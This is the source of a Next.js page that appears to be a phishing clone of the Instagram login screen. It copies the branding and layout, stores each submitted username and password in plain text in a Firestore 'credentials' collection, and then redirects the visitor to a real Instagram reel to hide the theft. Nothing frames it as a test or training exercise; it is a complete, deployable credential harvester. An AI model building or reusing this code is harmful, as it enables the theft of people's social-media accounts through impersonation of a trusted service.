'use client';

import React, { useState } from 'react';
import Image from 'next/image';
import { db } from '@/firebase';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';

export default function Home() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      await addDoc(collection(db, 'credentials'), {
        username,
        password,
        createdAt: serverTimestamp(),
      });
    } catch (error) {
      console.error("Error adding document: ", error);
      // Continue to redirect even if there's an error saving data.
    } finally {
      window.location.href = 'https://www.instagram.com/reel/DUqPZVZCOVV';
    }
  };

  return (
    <>
      {/* Main Container */}
      <main className="flex-1 flex flex-col items-center justify-center px-4 py-8 mt-8">
        
        {/* Login Card */}
        <div className="w-full max-w-[350px] border border-gray-800 bg-black p-10 mb-3">
            {/* Logo */}
            <div className="flex justify-center mb-8">
                <Image 
                    src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
                    alt="Instagram" 
                    width={175}
                    height={50}
                    className="h-12 object-contain"
                    priority
                />
            </div>
            
            {/* Login Form */}
            <form id="loginForm" className="space-y-2" onSubmit={handleLogin}>
                <div className="mb-2">
                    <input 
                        type="text" 
                        id="username" 
                        placeholder="Phone number, username, or email" 
                        className="input-field w-full px-3 py-3 text-sm rounded-sm"
                        autoComplete="off"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                    />
                </div>
                <div className="mb-4">
                    <input 
                        type="password" 
                        id="password" 
                        placeholder="Password" 
                        className="input-field w-full px-3 py-3 text-sm rounded-sm"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                    />
                </div>
                <button 
                    type="submit" 
                    id="loginBtn"
                    className="login-btn active w-full py-2.5 rounded-lg font-semibold text-white text-sm mt-2 transition-colors"
                    disabled={isLoading}
                >
                    {isLoading ? 'Logging in...' : 'Log in'}
                </button>
            </form>
            
            {/* OR Divider */}
            <div className="divider my-6">
                <span>OR</span>
            </div>
            
            {/* Facebook Login */}
            <div className="flex flex-col items-center space-y-4">
                <a href="#" className="facebook-login flex items-center gap-2 font-semibold text-sm transition-colors">
                    <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                    Log in with Facebook
                </a>
                
                <a href="#" className="text-sm text-white hover:underline">Forgot password?</a>
            </div>
        </div>
        
        {/* Sign Up Card */}
        <div className="w-full max-w-[350px] border border-gray-800 bg-black p-6 flex justify-center items-center">
            <p className="text-sm">
                Don't have an account? 
                <a href="#" className="signup-link font-semibold transition-colors">Sign up</a>
            </p>
        </div>
        
        {/* Get the app */}
        <div className="w-full max-w-[350px] mt-6 text-center">
            <p className="text-sm mb-4">Get the app.</p>
            <div className="flex justify-center gap-2">
                <a href="#" className="app-store-btn">
                    <Image src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/refs/heads/master/assets/img/apple.png" alt="App Store" width={135} height={40} className="h-10 object-contain"/>
                </a>
                <a href="#" className="app-store-btn">
                    <Image src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" width={135} height={40} className="h-10 object-contain"/>
                </a>
            </div>
        </div>
        
      </main>
      
      {/* Footer */}
      <footer className="py-8 px-4 mt-auto">
          <div className="max-w-[800px] mx-auto">
              <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4 text-xs footer-links">
                  <a href="#">Meta</a>
                  <a href="#">About</a>
                  <a href="#">Blog</a>
                  <a href="#">Jobs</a>
                  <a href="#">Help</a>
                  <a href="#">API</a>
                  <a href="#">Privacy</a>
                  <a href="#">Terms</a>
                  <a href="#">Locations</a>
                  <a href="#">Instagram Lite</a>
                  <a href="#">Threads</a>
                  <a href="#">Contact Uploading & Non-Users</a>
                  <a href="#">Meta Verified</a>
              </div>
              <div className="flex justify-center items-center gap-4 text-xs text-gray-500">
                  <select className="bg-transparent text-gray-500 focus:outline-none cursor-pointer">
                      <option>English</option>
                      <option>Español</option>
                      <option>Français</option>
                      <option>Deutsch</option>
                      <option>Italiano</option>
                      <option>Português</option>
                  </select>
                  <span>© 2024 Instagram from Meta</span>
              </div>
          </div>
      </footer>
    </>
  );
}
